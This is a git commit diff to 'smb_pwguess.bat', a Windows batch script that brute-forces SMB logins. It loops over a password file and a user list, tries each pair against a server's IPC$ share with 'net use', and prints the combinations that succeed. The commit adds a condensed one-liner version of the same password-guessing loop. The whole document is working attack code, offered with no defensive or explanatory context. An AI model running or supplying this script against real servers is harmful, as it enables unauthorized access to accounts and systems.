1f9041ef0f4704ef51285ed5f6655f47d8795264
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2020-12-04 14:53:40 -0700

    Update smb_pwguess.bat

--- smb_pwguess.bat
+++ smb_pwguess.bat
@@ -2,3 +2,6 @@
 DO @FOR /F %n in (listusers.txt) REM for each entry %n in listuers.txt
 DO @net use \\<SERVERIP>\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p REM if successful, show UI and PW
 && @net use /delete \\SERVERIP\IPC$ > NUL
+
+REM 1 liner
+@FOR /F %p in (passw.txt) DO @FOR /F %n in (listusers.txt) DO @net use \\<SERVERIP>\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
